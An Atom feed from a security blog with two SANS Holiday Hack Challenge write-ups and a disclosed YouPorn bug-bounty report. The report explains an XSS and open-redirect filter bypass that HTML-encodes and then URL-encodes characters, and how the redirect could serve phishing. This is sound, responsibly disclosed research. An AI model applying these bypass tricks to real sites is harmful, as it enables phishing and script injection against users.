&lt;/ol&gt;
&lt;p&gt;The topic of the second page of &lt;em&gt;The Great Book&lt;/em&gt; is the creation of flying
animals in Oz, which lead to the creation of flying reindeers.&lt;/p&gt;
&lt;p&gt;Alabaster Snowball's password is &lt;code&gt;stream_unhappy_buy_loss&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="3"&gt;
&lt;li&gt;&lt;cite&gt;The North Pole engineering team uses a Windows SMB server for sharing documentation and correspondence. Using your access to the Letters to Santa server, identify and enumerate the SMB file-sharing server. What is the file server share name?&lt;/cite&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The name of the share on &lt;code&gt;hhc17-smb-server&lt;/code&gt; is &lt;code&gt;FileStor&lt;/code&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="4"&gt;
&lt;li&gt;&lt;cite&gt;Elf Web Access (EWA. is the preferred mailer for North Pole elves, available internally at http://mail.northpolechristmastown.com. What can you learn from The Great Book page found in an e-mail on that server?&lt;/cite&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The fourth page of &lt;em&gt;The Great Book&lt;/em&gt; speaks of the battles between Munchkins and
Elves, the creation of the Lollipop Guild, and their infiltration in the North
Pole population.&lt;/p&gt;
&lt;ol class="arabic simple" start="5"&gt;
&lt;li&gt;&lt;cite&gt;How many infractions are required to be marked as naughty on Santa's Naughty and Nice List? What are the names of at least six insider threat moles?  Who is throwing the snowballs from the top of the North Pole Mountain and what is your proof?&lt;/cite&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;It takes four infractions to be marked as naughty on Santa's list.&lt;/p&gt;
&lt;p&gt;Here are six insider threat moles:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Boq Questrian&lt;/li&gt;
&lt;li&gt;Bini Aru&lt;/li&gt;
&lt;li&gt;Sheri Lewis&lt;/li&gt;
&lt;li&gt;Kirsty Evans&lt;/li&gt;
&lt;li&gt;Nina Fitzgerald&lt;/li&gt;
&lt;li&gt;Beverly Khalil&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The discussion between us, Sam the Snowman, and Bumble informs us that the
person throwing giant snowballs is Bumble, the Abominable Snow Monster.&lt;/p&gt;
&lt;ol class="arabic simple" start="6"&gt;
&lt;li&gt;&lt;cite&gt;The North Pole engineering team has introduced an Elf as a Service (EaaS.  platform to optimize resource allocation for mission-critical Christmas engineering projects at http://eaas.northpolechristmastown.com. Visit the system and retrieve instructions for accessing The Great Book page from C:\greatbook.txt. Then retrieve The Great Book PDF file by following those directions. What is the title of The Great Book page?&lt;/cite&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The title of the first page of &lt;em&gt;The Great Book&lt;/em&gt; is &lt;strong&gt;The Dreaded
Inter-Dimensional Tornadoes&lt;/strong&gt;.&lt;/p&gt;
&lt;ol class="arabic simple" start="7"&gt;
&lt;li&gt;&lt;cite&gt;Like any other complex SCADA systems, the North Pole uses Elf-Machine Interfaces (EMI. to monitor and control critical infrastructure assets. These systems serve many uses, including email access and web browsing. Gain access to the EMI server through the use of a phishing attack with your access to the EWA server. Retrieve The Great Book page from C:\GreatBookPage7.pdf. What does The Great Book page describe?&lt;/cite&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The seventh page of &lt;em&gt;The Great Book&lt;/em&gt; gives us details regarding the Witches of
Oz, their power, and their neutrality during the Great Schism.&lt;/p&gt;
&lt;ol class="arabic simple" start="8"&gt;
&lt;li&gt;&lt;cite&gt;Fetch the letter to Santa from the North Pole Elf Database at http://edb.northpolechristmastown.com. Who wrote the letter?&lt;/cite&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The letter was written by the Wizard of Oz, Santa's good friend.&lt;/p&gt;
&lt;ol class="arabic simple" start="9"&gt;
&lt;li&gt;&lt;cite&gt;Which character is ultimately the villain causing the giant snowball problem. What is the villain's motive?&lt;/cite&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The villain causing the giant snowball problem is Glinda, the &amp;quot;Good&amp;quot; Witch.
She cast a spell on Bumble to make him throw giant snowballs, in order to
create an all-out war between Elves and Munchkins. This would have allowed her
to make a profit, by selling spells to both sides of the war.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="conclusion"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id60"&gt;Conclusion&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Once again, the SANS staff outdid themselves and gave us an amazing Christmas
challenge. I thought implementing client-side attacks, such as XSS or phishing
attacks was a nice touch. It's also great that designed the challenge to that
people would have to pivot to an internal network. Overall, it kind of reminded
me of when I took my OSCP exam/lab.&lt;/p&gt;
&lt;p&gt;As usual, see you next year!&lt;/p&gt;
&lt;p&gt;[EDIT 2018-03-15]&lt;/p&gt;
&lt;p&gt;This write-up received an &lt;a class="reference external" href="https://holidayhackchallenge.com/2017/winners_answers.html"&gt;honorable mention from the SANS team&lt;/a&gt;.
Even though I didn't win any prize, I'm still super honored to receive this
recognition. Thanks to the SANS team for organizing this challenge, and
special thanks to Jerry Salinas for reviewing my write-up!&lt;/p&gt;
&lt;/div&gt;
</content></entry><entry><title>Meet beautiful XSS in your area: a YouPorn bug bounty [SFW]</title><link href="https://allyourbase.utouch.fr/posts/2017/03/28/meet-beautiful-xss-in-your-area-a-youporn-bug-bounty-sfw/" rel="alternate"></link><published>2017-03-28T00:00:00+02:00</published><updated>2017-03-28T00:00:00+02:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2017-03-28:/posts/2017/03/28/meet-beautiful-xss-in-your-area-a-youporn-bug-bounty-sfw/</id><summary type="html">&lt;img alt="youporn_logo.png" class="align-center" src="/images/meet-beautiful-xss-in-your-area-a-youporn-bug-bounty-sfw/youporn_logo.png" /&gt;
&lt;p&gt;I don't do bug bounties due to a lack of time. Although I have a &lt;a class="reference external" href="https://hackerone.com/the-useless-one"&gt;HackerOne
profile&lt;/a&gt;, you can see that I'm not so
active. However, &lt;a class="reference external" href="https://hackerone.com/myst404"&gt;a coworker of mine&lt;/a&gt; spends
quite some time on different bug bounty programs.&lt;/p&gt;
&lt;p&gt;On 2017-02-06 evening, when we were both connected to our work …&lt;/p&gt;</summary><content type="html">&lt;img alt="youporn_logo.png" class="align-center" src="/images/meet-beautiful-xss-in-your-area-a-youporn-bug-bounty-sfw/youporn_logo.png" /&gt;
&lt;p&gt;I don't do bug bounties due to a lack of time. Although I have a &lt;a class="reference external" href="https://hackerone.com/the-useless-one"&gt;HackerOne
profile&lt;/a&gt;, you can see that I'm not so
active. However, &lt;a class="reference external" href="https://hackerone.com/myst404"&gt;a coworker of mine&lt;/a&gt; spends
quite some time on different bug bounty programs.&lt;/p&gt;
&lt;p&gt;On 2017-02-06 evening, when we were both connected to our work Jabber server,
he told me that YouPorn had launched their &lt;a class="reference external" href="https://hackerone.com/youporn"&gt;bug bounty program on HackerOne&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;him: youporn bug bounty launched today btw&lt;/p&gt;
&lt;p&gt;me: on hacker one?&lt;/p&gt;
&lt;p&gt;him: yes&lt;/p&gt;
&lt;p&gt;me: no time, i'm migrating my DNS servers&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;As I was reading documentation on bind, he wrote me back:&lt;/p&gt;
&lt;blockquote&gt;
him: oh shit, exploitable XSS in the search bar, can't believe it&lt;/blockquote&gt;
&lt;p&gt;Now, things were interesting! I had to hop in. I was also surprised that
nobody had ever found it before. XSS in the search form is the base case.
&lt;span class="strike"&gt;I often go to&lt;/span&gt; errr, some of my friends often go to YouPorn, and
they've never found such a vulnerability on it before.&lt;/p&gt;
&lt;p&gt;Time was of the essence, because we wanted to have a working exploit and report
it before someone else did.&lt;/p&gt;
&lt;div class="section" id="from-lack-of-filtering-to-open-redirect"&gt;
&lt;h2&gt;From lack of filtering to open redirect&lt;/h2&gt;
&lt;p&gt;I fired up my browser and Burp, and sent a request on the search form. I
searched for &lt;code&gt;foobar&amp;quot;&lt;/code&gt;. As you can see in the following screenshot,
the search term is output, without any filtering (except for the capitalization)
in a &lt;a class="reference external" href="https://www.w3schools.com/tags/tag_meta.asp"&gt;meta tag&lt;/a&gt;:&lt;/p&gt;
&lt;img alt="first_payload.png" class="align-center" src="/images/meet-beautiful-xss-in-your-area-a-youporn-bug-bounty-sfw/first_payload.png" /&gt;
&lt;p&gt;However, when we tried to close the meta tag, and open another one, to put
our Javascript payload, we couldn't get it to work:&lt;/p&gt;
&lt;img alt="first_fail.png" class="align-center" src="/images/meet-beautiful-xss-in-your-area-a-youporn-bug-bounty-sfw/first_fail.png" /&gt;
&lt;p&gt;Disappointed, we still decided to exploit the meta HTML tag. It's a powerful
tag, because it has the &lt;code&gt;http-equiv&lt;/code&gt; directive. &lt;a class="reference external" href="https://www.w3schools.com/tags/att_meta_http_equiv.asp"&gt;This directive&lt;/a&gt; allows
you to define the equivalent of an HTTP header in the HTML code.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;http-equiv&lt;/code&gt; directive can take a value of &lt;code&gt;refresh&lt;/code&gt;, which
can be used to redirect a user to another page. This kind of &lt;a class="reference external" href="https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet"&gt;open redirect&lt;/a&gt;
vulnerability can be very useful in case of a phishing attack:&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;You send someone a link to &lt;a class="reference external" href="http://youporn.com"&gt;http://youporn.com&lt;/a&gt;, with your payload;&lt;/li&gt;
&lt;li&gt;Your payload redirects them to a site you control, imitating YouPorn's CSS;&lt;/li&gt;
&lt;li&gt;You ask them for their credentials, their credit card number, etc.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;We put the following payload to test our vulnerability:&lt;/p&gt;
&lt;img alt="second_fail.png" class="align-center" src="/images/meet-beautiful-xss-in-your-area-a-youporn-bug-bounty-sfw/second_fail.png" /&gt;
&lt;p&gt;As you can see, there is a slight problem: the dash in &lt;code&gt;http-equiv&lt;/code&gt;
is not inserted in the source code. I decided to use some XSS voodoo bypass,
and so, I decided to HTML encode, then URL encode the dash.&lt;/p&gt;
&lt;p&gt;A dash, &lt;code&gt;-&lt;/code&gt;, HTML-encoded is &lt;code&gt;&amp;amp;#45;&lt;/code&gt;, which, URL-encoded, is
&lt;code&gt;%26%2345%3b&lt;/code&gt;:&lt;/p&gt;
&lt;img alt="first_success.png" class="align-center" src="/images/meet-beautiful-xss-in-your-area-a-youporn-bug-bounty-sfw/first_success.png" /&gt;
&lt;p&gt;Boom, we now had a working payload, and were able to redirect users to a
URL of our choosing. Sweet!&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="marked-as-duplicate"&gt;
&lt;h2&gt;Marked as duplicate&lt;/h2&gt;
&lt;p&gt;Just as I had found the correct syntax, my coworker, who had already notified
YouPorn, got the following answer:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;In fact, this was reported already, &lt;strong&gt;but the original reporter did not
provide a working exploit&lt;/strong&gt;.  What I should do is to close it as duplicate,
because the original  bug was already reported. However &lt;strong&gt;I will leave it
open so you have a  chance to provide a working payload&lt;/strong&gt;.  Note that the
original ticket was triaged. If you find a working  payload, I will triage
your ticket as well as you managed to go further  in the exploitation.&lt;/p&gt;
&lt;p&gt;Thanks and happy hacking&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/div&gt;
&lt;div class="section" id="from-open-redirect-to-full-reflective-xss"&gt;
&lt;h2&gt;From open redirect to full reflective XSS&lt;/h2&gt;
&lt;p&gt;So that was it, somebody had already reported the vulnerability. However,
YouPorn had kindly decided to let the report open, so that we could find a
working payload, and we already had one with the open redirect payload.&lt;/p&gt;
&lt;p&gt;But then I thought &amp;quot;Wait a second, maybe I can use the same trick to put
&lt;code&gt;&amp;gt;&lt;/code&gt; and &lt;code&gt;&amp;lt;&lt;/code&gt; instead of a dash!&amp;quot;&lt;/p&gt;
&lt;p&gt;And indeed, it worked. With the &amp;quot;HTML-encode-then-URL-encode&amp;quot; trick, we could
insert arbitrary Javascript:&lt;/p&gt;
&lt;img alt="second_success.png" class="align-center" src="/images/meet-beautiful-xss-in-your-area-a-youporn-bug-bounty-sfw/second_success.png" /&gt;
&lt;p&gt;Obligatory pop-up:&lt;/p&gt;
&lt;img alt="w00t.png" class="align-center" src="/images/meet-beautiful-xss-in-your-area-a-youporn-bug-bounty-sfw/w00t.png" /&gt;
&lt;p&gt;We continued to do some tests afterwards, and we found out something weird
about YouPorn's HTML rendering: no matter how many recursions of HTML-encoding
we did on our payloads, they were still fully decoded server-side. This means
that:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;code&gt;&amp;amp;lt;&lt;/code&gt; became &lt;code&gt;&amp;lt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;amp;amp;lt;&lt;/code&gt; also became &lt;code&gt;&amp;lt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;amp;amp;amp;lt;&lt;/code&gt; &lt;strong&gt;also&lt;/strong&gt; became &lt;code&gt;&amp;lt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;etc.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Weird behaviour, but very interesting to bypass some filters!&lt;/p&gt;
&lt;p&gt;Anyway, I still have to migrate my DNS servers.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="timeline-yyyy-mm-dd"&gt;
&lt;h2&gt;Timeline (YYYY-MM-DD)&lt;/h2&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;strong&gt;2017-02-06&lt;/strong&gt;: Report sent to YouPorn&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2017-02-06&lt;/strong&gt;: Response from YouPorn saying that this bug was already
reported, but that we could keep trying to find a working payload&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2017-02-06&lt;/strong&gt;: Working payload sent to YouPorn&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2017-02-06&lt;/strong&gt;: Report triaged&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2017-02-10&lt;/strong&gt;: Bounty paid, $250&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2017-02-03&lt;/strong&gt;: Bug fixed&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2017-03-04&lt;/strong&gt;: Request to disclose publicly the report&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2017-03-28&lt;/strong&gt;: Public disclosure of the &lt;a class="reference external" href="https://hackerone.com/reports/203974"&gt;report&lt;/a&gt;
granted&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
</content></entry><entry><title>SANS Christmas Challenge 2016</title><link href="https://allyourbase.utouch.fr/posts/2017/01/05/sans-christmas-challenge-2016/" rel="alternate"></link><published>2017-01-05T00:00:00+01:00</published><updated>2017-01-05T00:00:00+01:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2017-01-05:/posts/2017/01/05/sans-christmas-challenge-2016/</id><summary type="html">&lt;img alt="sans_christmas_challenge_2016_logo.png" class="align-center" src="/images/sans-christmas-challenge-2016/sans_christmas_challenge_2016_logo.png" /&gt;
&lt;p&gt;This blog is beginning to look a lot like being exclusively about SANS Christmas
Challenges write-ups. What can I say, they're so good! Anyway, let's roll for
the &lt;a class="reference external" href="https://holidayhackchallenge.com/2016/"&gt;2016 edition of this marvelous Christmas Challenge&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Everything starts again with the Dosis children. As they're reminiscing on
&lt;a class="reference external" href="https://allyourbase.utouch.fr/posts/2016/01/09/sans-christmas-challenge-2015/#sans-christmas-challenge-2015"&gt;last year's Christmas&lt;/a&gt;,
they …&lt;/p&gt;</summary><content type="html">&lt;img alt="sans_christmas_challenge_2016_logo.png" class="align-center" src="/images/sans-christmas-challenge-2016/sans_christmas_challenge_2016_logo.png" /&gt;
&lt;p&gt;This blog is beginning to look a lot like being exclusively about SANS Christmas
Challenges write-ups. What can I say, they're so good! Anyway, let's roll for
the &lt;a class="reference external" href="https://holidayhackchallenge.com/2016/"&gt;2016 edition of this marvelous Christmas Challenge&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Everything starts again with the Dosis children. As they're reminiscing on
&lt;a class="reference external" href="https://allyourbase.utouch.fr/posts/2016/01/09/sans-christmas-challenge-2015/#sans-christmas-challenge-2015"&gt;last year's Christmas&lt;/a&gt;,
they hear Santa Claus landing on their roof, getting down the chimney, and
starting leaving presents in their living room. Then, suddenly, they hear
fighting sounds from downstairs. When they get down, everything is destroyed,
as if people had been fighting. But no trace of Santa Claus, only a business
card, which we can find in &lt;a class="reference external" href="https://quest2016.holidayhackchallenge.com/"&gt;the Dosis' living room&lt;/a&gt;...&lt;/p&gt;
&lt;div class="contents topic" id="table-of-contents"&gt;
&lt;p class="topic-title first"&gt;Table of contents&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;a class="reference internal" href="#part-1-a-most-curious-business-card" id="id1"&gt;Part 1: A Most Curious Business Card&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#part-2-awesome-package-konveyance" id="id2"&gt;Part 2: Awesome Package Konveyance&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#part-3-a-fresh-baked-holiday-pi" id="id3"&gt;Part 3: A Fresh-Baked Holiday Pi&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#elf-house-2" id="id4"&gt;Elf House #2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#workshop-first-door" id="id5"&gt;Workshop, first door&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#santa-s-office" id="id6"&gt;Santa's office&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#the-corridor" id="id7"&gt;The corridor&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#workshop-second-door" id="id8"&gt;Workshop, second door&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#train-station" id="id9"&gt;Train station&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#part-4-my-gosh-it-s-full-of-holes" id="id10"&gt;Part 4: My Gosh... It's Full of Holes&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="reference internal" href="#the-mobile-analytics-server-via-credentialed-login-access" id="id11"&gt;The Mobile Analytics Server (via credentialed login access)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#the-dungeon-game" id="id12"&gt;The Dungeon Game&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#the-debug-server" id="id13"&gt;The Debug Server&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#the-banner-ad-server" id="id14"&gt;The Banner Ad Server&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#the-uncaught-exception-handler-server" id="id15"&gt;The Uncaught Exception Handler Server&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#the-mobile-analytics-server-post-authentication" id="id16"&gt;The Mobile Analytics Server (post authentication)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#part-5-discombobulated-audio" id="id17"&gt;Part 5: Discombobulated Audio&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#epilogue-bringing-it-all-home" id="id18"&gt;Epilogue: Bringing It All Home&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference internal" href="#conclusion" id="id19"&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div class="section" id="part-1-a-most-curious-business-card"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id1"&gt;Part 1: A Most Curious Business Card&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;In the Dosis' living room, we find the business card of a certain Santa W.
Claus:&lt;/p&gt;
&lt;img alt="santa_business_card.png" class="align-center" src="/images/sans-christmas-challenge-2016/santa_business_card.png" /&gt;
&lt;p&gt;We now have Santa's &lt;a class="reference external" href="https://twitter.com/santawclaus"&gt;Twitter&lt;/a&gt; an
&lt;a class="reference external" href="https://www.instagram.com/santawclaus/"&gt;Instagram&lt;/a&gt;  accounts. We also see
that Santa has left his present bag behind. By going to it, we can see that
it's in fact a portal to the North Pole. Here, we can ask around for
information on Santa to his elves. We learn that they're running a bug bounty
program called SantaGram. To participate into this bug bounty program, we must
find the Android application.&lt;/p&gt;
&lt;p&gt;By talking to Pepper Minstix, we get a &lt;a class="reference external" href="https://www.northpolewonderland.com/dungeon.zip"&gt;link&lt;/a&gt;
to a copy of the &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Dungeon_%28video_game%29"&gt;Dungeon&lt;/a&gt;
video game. We now know what servers the elves are using to exchange files.
Let's see if we can find a copy of SantaGram on this server.&lt;/p&gt;
&lt;p&gt;If we look back at Santa's &lt;a class="reference external" href="https://www.instagram.com/santawclaus/"&gt;Instagram account&lt;/a&gt;,
we can see a &lt;a class="reference external" href="https://www.instagram.com/p/BNpA2kEBF85/"&gt;photo of one of the elves' desktop&lt;/a&gt;.
If we zoom in, we can see that this elf was building a copy of the coveted
SantaGram Android application:&lt;/p&gt;
&lt;img alt="instagram_elf_desktop.jpg" class="align-center" src="/images/sans-christmas-challenge-2016/instagram_elf_desktop.jpg" /&gt;
&lt;p&gt;With the name of the ZIP archive on the screenshot, we can download the
SantaGram application at this &lt;a class="reference external" href="https://www.northpolewonderland.com/SantaGram_v4.2.zip"&gt;URL&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;You can download the ZIP file &lt;a class="reference external" href="/docs/sans-christmas-challenge-2016/SantaGram_v4.2.zip"&gt;here&lt;/a&gt; (sha256: &lt;code&gt;51c3d144ffb25d06316bdd309a5e8a24cadb7592aace91036bd61f2f0c7440e5&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;Unfortunately, the archive is password protected:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; unzip SantaGram_v4.2.zip
&lt;span class="go"&gt;Archive:  SantaGram_v4.2.zip&lt;/span&gt;
&lt;span class="go"&gt;[SantaGram_v4.2.zip] SantaGram_4.2.apk password:&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Let's take a look at &lt;a class="reference external" href="https://twitter.com/santawclaus"&gt;Santa's tweets&lt;/a&gt;, to
see if we can find a clue:&lt;/p&gt;
&lt;img alt="santa_twitter.png" class="align-center" src="/images/sans-christmas-challenge-2016/santa_twitter.png" /&gt;
&lt;p&gt;Hmm, just a bunch of nonsense. Or is it? If we get the content of every tweet,
and paste them in a text file, we get the following string:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
SANTAELFHOHOHOCHRISTMASSANTACHRISTMASPEACEONEARTHCHRISTMASELFSANTAELFHOHOHO
GOODWILLTOWARDSMENSANTAPEACEONEARTHHOHOHOJOYSANTAGOODWILLTOWARDSMENJOYJOYQQ
GOODWILLTOWARDSMENGOODWILLTOWARDSMENJOYHOHOHOJOYELFELFPEACEONEARTHJOYHOHOHO
GOODWILLTOWARDSMENSANTACHRISTMASCHRISTMASPEACEONEARTHNORTHPOLEHOHOHOELFELFQ
JOYNORTHPOLECHRISTMASPEACEONEARTHNORTHPOLEJOYGOODWILLTOWARDSMENELFCHRISTMAS
CHRISTMASGOODWILLTOWARDSMENELFHOHOHOCHRISTMASPEACEONEARTHPEACEONEARTHJOYELF
HOHOHOGOODWILLTOWARDSMENNORTHPOLEGOODWILLTOWARDSMENSANTAPEACEONEARTHELFELFQ
GOODWILLTOWARDSMENP???????????????????????????????4CHRISTMASJOYELFELFSANTAQ
NORTHPOLEHOHOHOELFf...............................]PEACEONEARTHHOHOHOSANTAQ
SANTASANTAJOYELFQQf...............................]PEACEONEARTHCHRISTMASELF
CHRISTMASELFELFJOYf...............................]HOHOHOSANTAHOHOHOELFJOYQ
SANTASANTAJOYJOYQQf...............................]GOODWILLTOWARDSMENHOHOHO
NORTHPOLEELFELFELFf...............................]PEACEONEARTHHOHOHOSANTAQ
NORTHPOLECHRISTMASf...............................]PEACEONEARTHCHRISTMASJOY
PEACEONEARTHSANTAQf...............................]PEACEONEARTHNORTHPOLEELF
JOYCHRISTMASSANTAQf...............................]CHRISTMASHOHOHOCHRISTMAS
NORTHPOLEHOHOHOJOYf...............................]PEACEONEARTHPEACEONEARTH
SANTAELFELFJOYJOYQf.......aaaaaa/....._aaaaa......]PEACEONEARTHNORTHPOLEELF
GOODWILLTOWARDSMENf.......QQWQWQf.....]ELFWQ......]HOHOHOHOHOHOCHRISTMASJOY
NORTHPOLESANTAJOYQf.......HOHOHOf.....]JOYQQ......]CHRISTMASCHRISTMASHOHOHO
NORTHPOLEELFJOYJOYf.......SANTAQf.....]JOYQQ......]NORTHPOLEPEACEONEARTHELF
SANTAPEACEONEARTHQf.......HOHOHOf.....]SANTA......]PEACEONEARTHCHRISTMASELF
ELFSANTASANTAJOYQQf.......HOHOHOf.....]JOYQW......]CHRISTMASPEACEONEARTHJOY
JOYHOHOHONORTHPOLEf.......SANTAQ[.....)ELFQE......]PEACEONEARTHPEACEONEARTH
HOHOHOCHRISTMASJOYf.......$WJOYQ(......$WQQ(......]GOODWILLTOWARDSMENSANTAQ
JOYPEACEONEARTHELFf.......)JOYQ&amp;#64;........??'.......]SANTAPEACEONEARTHHOHOHOQ
JOYJOYPEACEONEARTHL........?$QV'..................]CHRISTMASJOYNORTHPOLEJOY
SANTAJOYCHRISTMASQk...............................jGOODWILLTOWARDSMENJOYJOY
GOODWILLTOWARDSMENW...............................jJOYNORTHPOLEJOYELFSANTAQ
HOHOHOSANTAJOYELFQQ...............................GOODWILLTOWARDSMENHOHOHOQ
CHRISTMASSANTASANTA;................;............=JOYNORTHPOLEPEACEONEARTHQ
GOODWILLTOWARDSMENQL...............)L............jHOHOHOHOHOHOCHRISTMASELFQ
CHRISTMASHOHOHOELFQQ...............dQ,..........&amp;lt;GOODWILLTOWARDSMENHOHOHOQQ
GOODWILLTOWARDSMENQQL.............&amp;lt;QQm,........_HOHOHOHOHOHOCHRISTMASELFELF
SANTACHRISTMASELFELFQc..........._mJOYQc......aPEACEONEARTHCHRISTMASSANTAQQ
CHRISTMASPEACEONEARTHQw........._mSANTAWmwaawGOODWILLTOWARDSMENSANTAJOYELFQ
PEACEONEARTHELFSANTAELFQw,,..__yHOHOHOELFQWQQWGOODWILLTOWARDSMENHOHOHOSANTA
ELFHOHOHONORTHPOLEELFJOYWGOODWILLTOWARDSMENCHRISTMASSANTACHRISTMASJOYSANTAQ
ELFELFHOHOHOHOHOHOHOHOHONORTHPOLEJOYHOHOHOGOODWILLTOWARDSMENELFELFELFSANTAQ
ELFHOHOHOJOYPEACEONEARTHPEACEONEARTHJOYGOODWILLTOWARDSMENJOYELFPEACEONEARTH
GOODWILLTOWARDSMENJOYGOODWILLTOWARDSMENGOODWILLTOWARDSMENSANTAELFJOYJOYJOYQ
ELFSANTAPEACEONEARTHJOYJOYQQDT????????????????????4NORTHPOLEPEACEONEARTHELF
NORTHPOLENORTHPOLESANTAQWT^.......................]NORTHPOLEELFHOHOHOJOYELF
HOHOHOHOHOHOCHRISTMASQQP`.........................]JOYGOODWILLTOWARDSMENELF
ELFPEACEONEARTHSANTAQQ(...........................]HOHOHOSANTACHRISTMASJOYQ
JOYJOYCHRISTMASELFJOY(............................]GOODWILLTOWARDSMENHOHOHO
CHRISTMASELFELFELFQQf.............................]HOHOHONORTHPOLEJOYELFJOY
SANTACHRISTMASJOYQQD..............................]HOHOHOHOHOHOSANTASANTAQQ
HOHOHOELFSANTAELFQQ(..............................]GOODWILLTOWARDSMENHOHOHO
GOODWILLTOWARDSMENW...............................]NORTHPOLEHOHOHOHOHOHOJOY
CHRISTMASHOHOHOJOYF...............................]GOODWILLTOWARDSMENSANTAQ
CHRISTMASCHRISTMAS[.........._aaaaaaaaaaaaaaaaaaaajPEACEONEARTHELFNORTHPOLE
SANTANORTHPOLEELFQ(........jJOYQWQWWQWWQWWWWWWWWWGOODWILLTOWARDSMENHOHOHOQQ
ELFPEACEONEARTHELF;.......jWWSANTAGOODWILLTOWARDSMENSANTAGOODWILLTOWARDSMEN
ELFJOYNORTHPOLEJOY`.......QWGOODWILLTOWARDSMENGOODWILLTOWARDSMENCHRISTMASQQ
PEACEONEARTHJOYELF.......]WPEACEONEARTHCHRISTMASNORTHPOLEPEACEONEARTHHOHOHO
CHRISTMASJOYHOHOHO.......]HOHOHOELFGOODWILLTOWARDSMENPEACEONEARTHCHRISTMASQ
JOYCHRISTMASJOYELF.......]PEACEONEARTHCHRISTMASGOODWILLTOWARDSMENELFHOHOHOQ
JOYPEACEONEARTHJOY.......)WGOODWILLTOWARDSMENSANTANORTHPOLEJOYPEACEONEARTHQ
CHRISTMASHOHOHOELF........$WPEACEONEARTHNORTHPOLESANTAPEACEONEARTHSANTAJOYQ
JOYHOHOHOELFELFJOY;.......-QWCHRISTMASGOODWILLTOWARDSMENPEACEONEARTHJOYELFQ
HOHOHOCHRISTMASJOY(........-?$QWJOYCHRISTMASSANTACHRISTMASCHRISTMASHOHOHOQQ
